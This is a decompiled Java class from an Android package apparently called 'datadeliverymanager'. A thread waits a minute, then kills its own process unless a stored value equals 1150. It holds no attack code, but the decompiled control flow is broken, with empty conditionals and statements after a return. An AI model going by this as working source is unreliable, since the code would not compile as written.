package com.vvt.datadeliverymanager;

import android.os.Process;
import android.os.SystemClock;

class e
  extends Thread
{
  e(d paramd) {}
  
  public void run()
  {
    long l = 60000L;
    SystemClock.sleep(l);
    Object localObject = d.a(this.a);
    if (localObject == null)
    {
      boolean bool1 = d.c();
      if (bool1) {}
      int i = Process.myPid();
      Process.killProcess(i);
    }
    for (;;)
    {
      return;
      localObject = d.a(this.a);
      boolean bool2 = localObject instanceof String;
      int j;
      if (bool2)
      {
        bool2 = d.c();
        if (bool2) {}
        j = Process.myPid();
        Process.killProcess(j);
      }
      else
      {
        localObject = (Integer)d.a(this.a);
        j = ((Integer)localObject).intValue();
        int m = 1150;
        if (j != m)
        {
          boolean bool3 = d.c();
          if (bool3) {}
          int k = Process.myPid();
          Process.killProcess(k);
        }
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/datadeliverymanager/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */